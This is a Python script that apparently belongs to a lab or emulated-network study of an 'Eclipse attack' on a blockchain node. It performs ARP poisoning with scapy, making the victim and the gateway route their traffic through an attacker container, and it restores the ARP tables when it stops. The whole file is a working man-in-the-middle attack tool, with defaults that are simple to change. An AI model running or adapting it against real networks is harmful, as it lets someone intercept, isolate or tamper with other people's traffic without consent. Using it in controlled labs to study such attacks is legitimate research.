#!/usr/bin/env python3
"""Container-friendly ARP spoofing for the Eclipse attack.

This script is intended to run inside the attacker container at
`as162h-new_eth_node-10.162.0.74`.

It poisons the victim node and its gateway so that traffic flows through the
attacker container, enabling the Layer 2 eclipse isolation.
"""

import argparse
import importlib.util
import subprocess
import sys
import time

DEFAULT_ATTACKER_IP = "10.162.0.74"
DEFAULT_TARGET_IP = "10.162.0.71"
DEFAULT_GATEWAY_IP = "10.162.0.254"
DEFAULT_IFACE = "net0"


def ensure_package(module_name, pip_name=None):
    pip_name = pip_name or module_name
    if importlib.util.find_spec(module_name) is not None:
        return

    print(f"[*] Installing missing package: {pip_name}")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--no-cache-dir", pip_name])


def parse_args():
    parser = argparse.ArgumentParser(
        description="Run the ARP poisoning half of the Eclipse attack from the attacker container",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--attacker-ip", default=DEFAULT_ATTACKER_IP,
                        help="Attacker container IP on the target subnet")
    parser.add_argument("--target-ip", "--victim-ip", default=DEFAULT_TARGET_IP,
                        help="Victim node IP")
    parser.add_argument("--gateway-ip", default=DEFAULT_GATEWAY_IP,
                        help="Gateway/router IP for the victim subnet")
    parser.add_argument("--iface", default=DEFAULT_IFACE,
                        help="Network interface to use for ARP poisoning")
    parser.add_argument("--no-install", action="store_true",
                        help="Do not attempt to install missing Python dependencies")
    parser.add_argument("--duration", type=int, default=0,
                        help="Run for a fixed number of seconds, then restore ARP tables")
    return parser.parse_args()


def enable_ip_forwarding():
    print("[*] Enabling IP forwarding")
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def get_mac(ip, iface):
    from scapy.all import ARP, Ether, srp
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        iface=iface,
        verbose=False,
    )
    if not ans:
        raise RuntimeError(f"Could not resolve MAC address for {ip}")
    return ans[0][1].hwsrc


def spoof(target_ip, spoof_ip, target_mac, attacker_mac, iface):
    from scapy.all import ARP, Ether, sendp
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac,
    )
    sendp(pkt, iface=iface, verbose=False)


def restore(target_ip, spoof_ip, target_mac, real_mac, iface):
    from scapy.all import ARP, Ether, sendp
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=real_mac,
    )
    sendp(pkt, iface=iface, verbose=False)


def main():
    args = parse_args()

    if not args.no_install:
        ensure_package("scapy")

    from scapy.all import get_if_hwaddr

    enable_ip_forwarding()

    print("[*] Resolving MAC addresses...")
    attacker_mac = get_if_hwaddr(args.iface)
    target_mac = get_mac(args.target_ip, args.iface)
    gateway_mac = get_mac(args.gateway_ip, args.iface)

    print(f"[*] Attacker    : {args.attacker_ip} ({attacker_mac})")
    print(f"[*] Victim      : {args.target_ip} ({target_mac})")
    print(f"[*] Gateway     : {args.gateway_ip} ({gateway_mac})")
    print(f"[*] Interface   : {args.iface}")
    print("[*] Starting ARP poisoning loop (Ctrl+C to stop)")

    stopped = False
    start_time = time.time()
    try:
        while True:
            spoof(args.target_ip, args.gateway_ip, target_mac, attacker_mac, args.iface)
            spoof(args.gateway_ip, args.target_ip, gateway_mac, attacker_mac, args.iface)
            if args.duration and time.time() - start_time > args.duration:
                print("[*] Duration reached, restoring ARP tables")
                break
            time.sleep(1.5)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received — restoring ARP tables")
        stopped = True
    finally:
        for _ in range(5):
            restore(args.target_ip, args.gateway_ip, target_mac, gateway_mac, args.iface)
            restore(args.gateway_ip, args.target_ip, gateway_mac, target_mac, args.iface)
            time.sleep(0.5)
        print("[*] ARP tables restored")
        if stopped:
            print("[*] Attack stopped cleanly")


if __name__ == "__main__":
    main()
